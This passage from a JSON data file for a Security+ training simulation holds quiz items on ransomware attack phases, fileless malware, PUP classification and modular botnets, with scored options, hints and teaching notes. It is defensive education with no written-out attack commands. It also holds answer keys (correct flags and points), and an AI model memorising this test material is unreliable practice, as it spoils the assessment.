      "sequence": 7,
      "title": "Pre-Ransomware Indicators",
      "narrative": "Dr. Chen presents a sequence: 'Tuesday: initial access via RDP. Wednesday: Mimikatz detected on DC. Thursday: rclone installed, 400GB transferred to Mega.nz. Friday: PsExec used to push executable to 50 servers. What's about to happen?'",
      "question": "Based on this timeline, what attack phase is imminent?",
      "options": [
        {
          "id": "A",
          "text": "Initial access - the attack is just beginning",
          "is_correct": false,
          "points": 0,
          "feedback": {
            "short": "Initial access already happened Tuesday",
            "detailed": "Initial access was Tuesday via RDP. We're now 4 days into the attack. The attacker has: compromised domain credentials (Mimikatz on DC), exfiltrated data (400GB to Mega), and staged malware on 50 servers (PsExec push). We're at the END of the attack chain, not the beginning.",
            "consequence": "Thinking the attack is beginning when it's about to conclude."
          }
        },
        {
          "id": "B",
          "text": "Data exfiltration - they're stealing information",
          "is_correct": false,
          "points": 15,
          "feedback": {
            "short": "Exfiltration already happened Thursday",
            "detailed": "Data exfiltration happened Thursday - 400GB already transferred to Mega.nz. That phase is complete. The question asks what's ABOUT to happen. The PsExec distribution of executables to 50 servers is the current activity - that's staging for the next phase. What comes after data theft and malware staging in ransomware operations?",
            "consequence": "Focus on past exfiltration while ransomware deployment is imminent."
          }
        },
        {
          "id": "C",
          "text": "Ransomware deployment - executable staged on servers, encryption imminent",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Final stage of ransomware attack",
            "detailed": "This is the ransomware playbook: Initial access (RDP) â†’ Credential theft (Mimikatz) â†’ Data exfiltration (rclone/Mega) â†’ Mass deployment (PsExec to 50 servers). The executable pushed to servers is ransomware. Exfiltration before encryption enables double extortion ('pay or we leak'). Ransomware execution is imminent - likely this weekend.",
            "consequence": "Correct identification enables emergency response: isolate network, prevent ransomware execution."
          }
        },
        {
          "id": "D",
          "text": "Lateral movement - spreading to more systems",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Lateral movement already happened",
            "detailed": "Lateral movement happened throughout the week - compromising the DC, moving to servers. The PsExec to 50 servers isn't spreading for more access - it's DEPLOYING ransomware to systems already accessed. This is the deployment phase, not the spreading phase.",
            "consequence": "Try to stop lateral movement that already happened instead of preventing ransomware execution."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "What happens after data exfiltration in a double extortion ransomware attack?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "Ransomware playbook: access â†’ credentials â†’ exfiltrate â†’ deploy ransomware. PsExec to 50 servers = mass deployment = encryption imminent."
        }
      ],
      "learning_note": "Modern ransomware follows predictable phases: Initial Access â†’ Credential Theft â†’ Lateral Movement â†’ Data Exfiltration â†’ Ransomware Deployment. Recognizing which phase you're in enables appropriate response. Mass executable deployment via PsExec/GPO/WMI after data exfiltration = imminent ransomware execution.",
      "unlocks_artifact": "artifact_5"
    },
    {
      "id": "decision_8",
      "sequence": 8,
      "title": "Fileless Malware Recognition",
      "narrative": "'Not all malware writes files to disk,' Dr. Chen notes. 'You see: PowerShell process with encoded command, decodes to download script from internet, script runs entirely in memory, no new files on disk, but system is now beaconing to external C2. What malware technique is this?'",
      "question": "What malware technique is being used here?",
      "options": [
        {
          "id": "A",
          "text": "Traditional trojan with disk-based payload",
          "is_correct": false,
          "points": 0,
          "feedback": {
            "short": "No files written to disk",
            "detailed": "Traditional malware writes executable files to disk. This scenario explicitly states 'no new files on disk' - the payload runs entirely in memory. This is fileless malware, specifically designed to avoid disk-based detection.",
            "consequence": "File-based scanning finds nothing while system remains compromised."
          }
        },
        {
          "id": "B",
          "text": "Fileless malware - executes entirely in memory without disk artifacts",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Memory-only execution",
            "detailed": "This is fileless malware: downloaded and executed entirely in memory, no files written to disk, uses legitimate tools (PowerShell). This evades traditional file-based antivirus. Detection requires: PowerShell logging, memory scanning, behavioral analysis, and network monitoring for C2. The lack of disk artifacts doesn't mean no malware.",
            "consequence": "Correct identification focuses response on memory analysis, script logging, and behavioral detection."
          }
        },
        {
          "id": "C",
          "text": "Rootkit hiding files from detection",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Rootkits hide existing files, fileless never creates them",
            "detailed": "Rootkits hide files/processes that DO exist - they manipulate the OS to conceal artifacts. Fileless malware never creates disk artifacts in the first place - it runs entirely in memory. The distinction matters: rootkit hunting looks for hidden files; fileless detection looks at memory and behavior.",
            "consequence": "Rootkit scanning when the malware has no files to hide."
          }
        },
        {
          "id": "D",
          "text": "Encrypted malware evading antivirus",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Encryption is separate from fileless execution",
            "detailed": "Malware encryption (packers, crypters) hides the payload in an encrypted wrapper ON DISK. Fileless malware doesn't use encryption to evade - it avoids disk entirely. The encoded PowerShell is obfuscation for the script, not encryption of a disk-based payload.",
            "consequence": "Focus on encryption/packing when the issue is memory-only execution."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "What technique describes malware that runs in memory without writing files to disk?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "Fileless malware executes entirely in memory. Detection requires script logging, memory analysis, and behavioral monitoring - not file scanning."
        }
      ],
      "learning_note": "Fileless malware executes in memory without disk artifacts, evading traditional file-based detection. Common techniques: PowerShell scripts in memory, reflective DLL injection, .NET in-memory execution. Detection requires: PowerShell ScriptBlock logging, memory scanning, process behavior monitoring, and network analysis. The absence of files doesn't mean absence of malware."
    },
    {
      "id": "decision_9",
      "sequence": 9,
      "title": "Malware vs PUP Classification",
      "narrative": "Dr. Chen shows a sample: 'This program: installs a browser toolbar, changes homepage and search defaults, displays additional advertisements, was installed with user consent (buried in EULA), doesn't steal data or provide backdoor access. How should we classify this?'",
      "question": "How should this software be classified?",
      "options": [
        {
          "id": "A",
          "text": "Malware - it modifies system without meaningful consent",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Consent (even buried) changes classification",
            "detailed": "The user technically consented via EULA. While the consent was not truly informed, this distinguishes it from malware which installs without ANY consent. The software is unwanted and annoying but doesn't perform clearly malicious actions (no data theft, no backdoor). This is the gray area of PUPs.",
            "consequence": "Aggressive classification may conflict with legal/policy constraints."
          }
        },
        {
          "id": "B",
          "text": "Potentially Unwanted Program (PUP) - unwanted but not clearly malicious",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! PUP classification for gray-area software",
            "detailed": "This is a Potentially Unwanted Program (PUP) / Potentially Unwanted Application (PUA): installed with some form of consent (even if misleading), performs annoying but not clearly malicious actions, doesn't steal data or provide remote access. PUPs are handled differently than malware - often user choice whether to remove.",
            "consequence": "Appropriate classification enables user-choice handling rather than forced removal."
          }
        },
        {
          "id": "C",
          "text": "Legitimate software - user agreed to installation",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Buried consent and unwanted behavior isn't truly legitimate",
            "detailed": "While technically legal, software that buries consent in EULAs and performs unwanted modifications isn't 'legitimate' in the sense of being genuinely desired. The PUP classification acknowledges that it's not quite malware but also not genuinely legitimate software.",
            "consequence": "Allow software that users don't actually want."
          }
        },
        {
          "id": "D",
          "text": "Adware - displays unwanted advertisements",
          "is_correct": false,
          "points": 15,
          "feedback": {
            "short": "Adware is a type of PUP, not a separate category",
            "detailed": "Adware IS a type of PUP. The broader classification is PUP, which includes adware, browser hijackers, toolbars, etc. 'Adware' describes the behavior; 'PUP' is the classification category. Both are correct, but PUP is the more complete classification.",
            "consequence": "Technically correct but PUP is the classification category."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "What classification covers software that's unwanted but not clearly malicious, often installed via bundled/deceptive consent?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "PUP (Potentially Unwanted Program) covers gray-area software: adware, browser hijackers, bundled toolbars - unwanted but with some form of consent."
        }
      ],
      "learning_note": "PUP (Potentially Unwanted Program) classification covers software that: has some form of user consent (even buried/misleading), performs unwanted but not clearly malicious actions, includes adware, browser hijackers, bundled toolbars. PUPs are distinguished from malware by the consent element and from legitimate software by the unwanted behavior."
    },
    {
      "id": "decision_10",
      "sequence": 10,
      "title": "Comprehensive Malware Analysis",
      "narrative": "Dr. Chen presents a final challenge: 'Sample analysis: spreads via phishing emails with macro documents, establishes persistence via scheduled task, uses DNS for C2 communication, downloads additional modules (banking credential stealer, email spreader), operates as part of larger botnet infrastructure. Provide comprehensive classification.'",
      "question": "What is the comprehensive classification of this malware?",
      "options": [
        {
          "id": "A",
          "text": "Trojan dropper - delivers other malware via phishing",
          "is_correct": false,
          "points": 15,
          "feedback": {
            "short": "Only describes initial delivery, not full capability",
            "detailed": "The initial infection IS via trojan (macro document), and it DOES drop additional modules. But the full picture includes: modular design, credential stealing, self-spreading capability, and botnet membership. 'Trojan dropper' captures the delivery mechanism but misses the broader functionality.",
            "consequence": "Incomplete understanding of threat capability."
          }
        },
        {
          "id": "B",
          "text": "Modular botnet malware with trojan delivery, spyware payload, and worm spreading capability",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Comprehensive multi-type classification",
            "detailed": "Complete classification: Trojan delivery (phishing/macro), modular architecture (downloads additional capabilities), spyware function (banking credential stealer), worm-like spreading (email spreader module), botnet membership (part of larger infrastructure). Modern malware often combines multiple types - comprehensive classification captures all capabilities.",
            "consequence": "Complete understanding enables comprehensive defense: email security, credential protection, network monitoring, botnet takedown coordination."
          }
        },
        {
          "id": "C",
          "text": "Worm - it spreads via email",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Has worm capability but that's not the full picture",
            "detailed": "The email spreader module gives it worm-like self-propagation capability, but the initial infection was via phishing (trojan), it has credential stealing (spyware), and it's part of a botnet. Calling it just a 'worm' misses most of its functionality.",
            "consequence": "Focus only on email spreading when credential theft and botnet control are also threats."
          }
        },
        {
          "id": "D",
          "text": "Spyware - it steals banking credentials",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Credential stealing is one function, not the full picture",
            "detailed": "The banking credential stealer is ONE module. The malware also spreads, participates in a botnet, and can download other modules. Modern modular malware can't be classified by a single function - it has multiple capabilities that must all be understood.",
            "consequence": "Focus only on credential theft when malware has broader capabilities."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "Modern malware often combines multiple types. What capabilities does this sample have?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "Look at: delivery method (trojan), payload functions (spyware, spreader), architecture (modular, botnet). Multiple classifications may apply."
        }
      ],
      "learning_note": "Modern malware often combines multiple types: trojan delivery, modular payload loading, spyware/RAT capabilities, worm-like spreading, botnet membership. Comprehensive classification captures all capabilities because each requires different defensive measures. Examples like Emotet, TrickBot demonstrate this multi-capability architecture."
    }
  ],
  
  "summary_teaching_points": [
    {
      "topic": "Malware Types",
      "key_points": [
        "Virus: self-replicating, attaches to files, requires host",
        "Worm: self-propagating, exploits vulnerabilities, no user action",
        "Trojan: disguised as legitimate, doesn't self-replicate, user action required",
        "Ransomware: encrypts data, demands payment",
        "RAT: provides remote access and control",
        "Modern malware often combines multiple types"
      ]
    },
    {
      "topic": "Indicators of Compromise",
      "key_points": [
        "Network IoCs: IPs, domains, URLs - block C2 for immediate impact",
        "Host IoCs: file hashes, registry keys, scheduled tasks",
        "Behavioral IoCs: process chains, authentication patterns",
        "IoCs have shelf life - attackers change infrastructure"
      ]
    },
    {
      "topic": "Malware Behaviors",
      "key_points": [
        "Persistence: survive reboot (registry, tasks, services)",
        "Defense evasion: avoid detection (injection, LOLBins, fileless)",
        "C2: communicate with attackers (beacons, DNS, encrypted)",
        "Recognize behavior patterns to identify attack phase"
      ]
    },
    {
      "topic": "Living Off the Land",
      "key_points": [
        "LOLBins are legitimate tools abused for malicious purposes",
        "Cannot block - must detect abuse via command line and process ancestry",
        "Common LOLBins: PowerShell, certutil, mshta, wmic, regsvr32",
        "Process chain analysis reveals abuse patterns"
      ]
    },
    {
      "topic": "Detection Strategies",
      "key_points": [
        "File-based detection misses fileless malware",
        "Behavioral detection catches what signatures miss",
        "Process ancestry reveals malicious chains",
        "Network analysis identifies C2 patterns"
      ]
    }
  ],
  
  "weakness_mapping": {
    "provides_foundation_for": ["D2-SIM-001", "D2-SIM-003"],
    "addresses_gaps": [
      "Malware type classification",
      "IoC identification and prioritization",
      "Behavioral indicator analysis",
      "LOLBin detection",
      "Attack phase recognition"
    ]
  },
  
  "prerequisites": [],
  "unlocks": ["D2-SIM-001_retry", "D2-SIM-003_retry"],
  
  "metadata": {
    "version": "1.0",
    "created": "2024-02-13",
    "author": "Security+ Training System",
    "domain_alignment": "Domain 2: Threats, Vulnerabilities, and Mitigations",
    "job_role_alignment": ["SOC Analyst", "Malware Analyst", "Incident Responder"],
    "learning_focus": "Malware identification and indicator analysis fundamentals"
  }
}
